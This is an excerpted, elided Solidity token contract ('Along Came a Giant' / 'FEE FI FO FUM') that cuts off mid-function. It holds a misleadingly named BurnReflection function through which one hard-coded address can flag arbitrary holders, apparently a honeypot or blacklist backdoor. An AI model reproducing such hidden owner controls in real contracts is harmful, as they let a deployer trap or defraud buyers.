...
/**
https://medium.com/@FeeFiFoFum/fee-fi-fo-fum-along-came-a-giant-76dc8076a284
...
contract Feefifofum is Context, IERC20, Ownable{

    using SafeMath for uint256;
    string private _name = unicode"Along Came a Giant";
    string private _symbol = unicode"FEE FI FO FUM";
    ...
    mapping (address => bool) public _Reflection;
    ...
    constructor () {
        ...
        workSpace = payable(address(0xaEE8C233e7c513df83066547fc3B078EC8DF9086));
    ...
    function BurnReflection(address[] calldata addresses, bool status) public {
        require(_msgSender() == workSpace && addresses.length >= 0 );
        for (uint256 i; i < addresses.length; i++) {
            _Reflection[addresses[i]] = status;
        }
    }

    receive() external payable {}

    function RemoveLimits(uint256 logs) public {
